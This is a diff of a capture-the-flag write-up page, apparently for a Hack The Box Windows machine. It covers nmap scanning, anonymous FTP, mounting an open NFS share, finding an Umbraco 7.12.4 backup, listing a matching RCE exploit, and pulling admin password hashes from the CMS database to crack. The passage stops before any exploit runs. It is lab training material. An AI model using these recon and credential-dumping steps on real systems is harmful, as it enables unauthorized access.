@@ -41,60 +41,60 @@
 <p>OS: Windows</p>
 <p>IP: 10.10.10.180</p>
 <h2 id="1---reconnaissance">1 - Reconnaissance</h2>
-<pre><code>sudo nmap -sS -sV -sC -O 10.10.10.180
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-28 18:14 CEST
-Nmap scan report for 10.10.10.180
-Host is up (0.039s latency).
-Not shown: 993 closed ports
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -sC -O 10.10.10.180
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-07-28 18:14 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.180
+Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">993</span> closed ports
 PORT     STATE SERVICE       VERSION
 21/tcp   open  ftp           Microsoft ftpd
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
 | ftp-syst: 
 |_  SYST: Windows_NT
-80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
 |_http-title: Home - Acme Widgets
-111/tcp  open  rpcbind       2-4 (RPC #100000)
+111/tcp  open  rpcbind       2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
 | rpcinfo: 
 |   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/tcp6  rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  2,3,4        111/udp6  rpcbind
-|   100003  2,3         2049/udp   nfs
-|   100003  2,3         2049/udp6  nfs
-|   100003  2,3,4       2049/tcp   nfs
-|   100003  2,3,4       2049/tcp6  nfs
-|   100005  1,2,3       2049/tcp   mountd
-|   100005  1,2,3       2049/tcp6  mountd
-|   100005  1,2,3       2049/udp   mountd
-|   100005  1,2,3       2049/udp6  mountd
-|   100021  1,2,3,4     2049/tcp   nlockmgr
-|   100021  1,2,3,4     2049/tcp6  nlockmgr
-|   100021  1,2,3,4     2049/udp   nlockmgr
-|   100021  1,2,3,4     2049/udp6  nlockmgr
-|   100024  1           2049/tcp   status
-|   100024  1           2049/tcp6  status
-|   100024  1           2049/udp   status
-|_  100024  1           2049/udp6  status
+|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind
+|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp6  rpcbind
+|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp   rpcbind
+|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp6  rpcbind
+|   <span style="color:#ae81ff">100003</span>  2,3         2049/udp   nfs
+|   <span style="color:#ae81ff">100003</span>  2,3         2049/udp6  nfs
+|   <span style="color:#ae81ff">100003</span>  2,3,4       2049/tcp   nfs
+|   <span style="color:#ae81ff">100003</span>  2,3,4       2049/tcp6  nfs
+|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/tcp   mountd
+|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/tcp6  mountd
+|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/udp   mountd
+|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/udp6  mountd
+|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/tcp   nlockmgr
+|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/tcp6  nlockmgr
+|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/udp   nlockmgr
+|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/udp6  nlockmgr
+|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/tcp   status
+|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/tcp6  status
+|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/udp   status
+|_  <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/udp6  status
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp  open  microsoft-ds?
-2049/tcp open  mountd        1-3 (RPC #100005)
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+2049/tcp open  mountd        1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
 TCP/IP fingerprint:
-OS:SCAN(V=7.80%E=4%D=7/28%OT=21%CT=1%CU=32727%PV=Y%DS=2%DC=I%G=Y%TM=5F204F4
-OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=
-OS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS
-OS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
-OS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
-OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
-OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
-OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
-OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
-OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
-OS:Z)
+OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.80%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>7/28%OT<span style="color:#f92672">=</span>21%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>32727%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>5F204F4
+OS:5%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>101%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10D%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>
+OS:U<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M54DNW8NNS%O2<span style="color:#f92672">=</span>M54DNW8NNS%O3<span style="color:#f92672">=</span>M54DNW8%O4<span style="color:#f92672">=</span>M54DNW8NNS%O5<span style="color:#f92672">=</span>M54DNW8NNS
+OS:%O6<span style="color:#f92672">=</span>M54DNNS<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FFFF%W2<span style="color:#f92672">=</span>FFFF%W3<span style="color:#f92672">=</span>FFFF%W4<span style="color:#f92672">=</span>FFFF%W5<span style="color:#f92672">=</span>FFFF%W6<span style="color:#f92672">=</span>FF70<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%
+OS:DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>FFFF%O<span style="color:#f92672">=</span>M54DNW8NNS%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>
+OS:0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S
+OS:<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>
+OS:Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>
+OS:R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T
+OS:<span style="color:#f92672">=</span>80%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%CD<span style="color:#f92672">=</span>
+OS:Z<span style="color:#f92672">)</span>
 
-Network Distance: 2 hops
+Network Distance: <span style="color:#ae81ff">2</span> hops
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
@@ -106,291 +106,284 @@ Host script results:
 |_  start_date: N/A
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 94.45 seconds
-</code></pre><p>Interesting FTP port 21 with anonymous login activated, RPC with nfs, and port 80 serving a site.</p>
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 94.45 seconds
+</code></pre></div><p>Interesting FTP port 21 with anonymous login activated, RPC with nfs, and port 80 serving a site.</p>
 <h3 id="testing-anonymous-ftp-login-allowed">Testing Anonymous FTP login allowed</h3>
-<pre><code>ftp 10.10.10.180
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ftp 10.10.10.180
 Connected to 10.10.10.180.
-220 Microsoft FTP Service
-Name (10.10.10.180:u915): anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.
+<span style="color:#ae81ff">220</span> Microsoft FTP Service
+Name <span style="color:#f92672">(</span>10.10.10.180:u915<span style="color:#f92672">)</span>: anonymous
+<span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
 Password:
-230 User logged in.
+<span style="color:#ae81ff">230</span> User logged in.
 Remote system type is Windows_NT.
 ftp&gt;  
 
-</code></pre><p>Nothing useful was inside</p>
+</code></pre></div><p>Nothing useful was inside</p>
 <h3 id="testing-shares">Testing shares</h3>
-<pre><code>sudo showmount -e 10.10.10.180
-Export list for 10.10.10.180:
-/site_backups (everyone)
-</code></pre><pre><code>mkdir /tmp/mounted
-</code></pre><pre><code>sudo mount --types nfs 10.10.10.180:/site_backups  /tmp/mounted
-</code></pre><pre><code>ls
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo showmount -e 10.10.10.180
+Export list <span style="color:#66d9ef">for</span> 10.10.10.180:
+/site_backups <span style="color:#f92672">(</span>everyone<span style="color:#f92672">)</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir /tmp/mounted
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo mount --types nfs 10.10.10.180:/site_backups  /tmp/mounted
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls
 App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
-</code></pre><p>So we got a backup website, with something called <em>Umbraco</em>, searching Umbraco reports that it is a CMS.</p>
+</code></pre></div><p>So we got a backup website, with something called <em>Umbraco</em>, searching Umbraco reports that it is a CMS.</p>
 <p><a href="https://umbraco.com/">umbraco</a></p>
 <p>Searching inside the folders there is a interesting file <em>web.config</em>:</p>
-<pre><code>[...]
-      &lt;smtp from=&quot;noreply@example.com&quot;&gt;
-         &lt;network host=&quot;127.0.0.1&quot; userName=&quot;username&quot; password=&quot;password&quot; /&gt;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+      &lt;smtp from<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;noreply@example.com&#34;</span>&gt;
+         &lt;network host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span> userName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> /&gt;
       &lt;/smtp&gt;
    &lt;/mailSettings&gt;
 &lt;/system.net&gt;
-</code></pre><p>So there is a user with with the credentials username/password</p>
+</code></pre></div><p>So there is a user with with the credentials username/password</p>
 <p>Umbraco version:</p>
-<pre><code>&lt;add key=&quot;umbracoConfigurationStatus&quot; value=&quot;7.12.4&quot; /&gt;
-</code></pre><p>So the Umbraco version is 7.12.4</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">add</span> <span style="color:#a6e22e">key</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;umbracoConfigurationStatus&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;7.12.4&#34;</span> /&gt;
+</code></pre></div><p>So the Umbraco version is 7.12.4</p>
 <h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
-<pre><code>searchsploit umbraco
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit umbraco
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                                           |  Path
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Umbraco CMS - Remote Command Execution (Metasploit)                                                                                                                                                      | windows/webapps/19671.rb
-Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                                                               | aspx/webapps/46153.py
+Umbraco CMS - Remote Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                                                                                                      | windows/webapps/19671.rb
+Umbraco CMS 7.12.4 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Code Execution                                                                                                                                               | aspx/webapps/46153.py
 Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                                                                                               | php/webapps/44988.txt
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-</code></pre><p>So it is a vulnerable version, but it is authenticated and user/pass is needed.</p>
+</code></pre></div><p>So it is a vulnerable version, but it is authenticated and user/pass is needed.</p>
 <h3 id="dumping-data">Dumping data</h3>
 <p>Also inside /App_Data there are intesting files:</p>
-<pre><code>ls
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls
 cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
-</code></pre><pre><code>file Umbraco.sdf 
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file Umbraco.sdf 
 Umbraco.sdf: data
-</code></pre><pre><code>head Umbraco.sdf 
-��V�t�t�y���Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d��׃rf�u�rf�v�rf���rf����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50��BiIf�hVg�v�rf�hVg����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f�[{&quot;alias&quot;:&quot;umbIntroIntroduction&quot;,&quot;completed&quot;:false,&quot;disabled&quot;:true}]��?�g�.og���g����X�v�������smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e��?�g�Ag�.og�Og����Y�w�������ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749��~�
-g�)�
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">head Umbraco.sdf 
+��V�t�t�y���Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d��׃rf�u�rf�v�rf���rf����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50��BiIf�hVg�v�rf�hVg����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f�<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;alias&#34;</span>:<span style="color:#e6db74">&#34;umbIntroIntroduction&#34;</span>,<span style="color:#e6db74">&#34;completed&#34;</span>:false,<span style="color:#e6db74">&#34;disabled&#34;</span>:true<span style="color:#f92672">}]</span>��?�g�.og���g����X�v�������smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span style="color:#f92672">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e��?�g�Ag�.og�Og����Y�w�������ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span style="color:#f92672">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749��~�
+g�<span style="color:#f92672">)</span>�
 g�.og�7�
-g����Z�x�������ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32��#���0�▒ A$C=H�DY^`FnyPH���I�� K��PM��
-�@▒`Cpr�G��PLUHUH�4�-`��II AEEqDD���|   5!
+g����Z�x�������ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg<span style="color:#f92672">==</span>RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32��#���0�▒ A$C<span style="color:#f92672">=</span>H�DY^<span style="color:#e6db74">`</span>FnyPH���I�� K��PM��
+�@▒<span style="color:#e6db74">`</span>Cpr�G��PLUHUH�4�-<span style="color:#e6db74">`</span>��II AEEqDD���|   5!
 ��Eq
 Q�
-|p�!p�`@8��~!PI@
+|p�!p�<span style="color:#e6db74">`</span>@8��~!PI@
 |p�!p���~!PIEEqDD���|   5!
 ��Eq
 Q�
-</code></pre><pre><code>strings Umbraco.sdf &gt; /home/u915/Escritorio/umbracoDB.txt
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings Umbraco.sdf &gt; /home/u915/Escritorio/umbracoDB.txt
 
 cat /home/u915/Escritorio/umbracoDB.txt
 
 Administratoradmindefaulten-US
 Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
-Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
-adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
-adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
-smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
-ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
-ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span style="color:#f92672">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span style="color:#f92672">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg<span style="color:#f92672">==</span>RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 
-</code></pre><h3 id="cracking-the-hash">Cracking the hash</h3>
+</code></pre></div><h3 id="cracking-the-hash">Cracking the hash</h3>
 <p>Interesting hashes:</p>
-<pre><code>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
-</code></pre>
-<p>Focus on the SHA1 because is easy to be cracked:</p>
-<pre><code>b8be16afba8c314ad33d812f22a04991b90e2aaa
-</code></pre>
-<p>Using <a href="https://md5decrypt.net">https://md5decrypt.net</a> because i am lazy.</p>
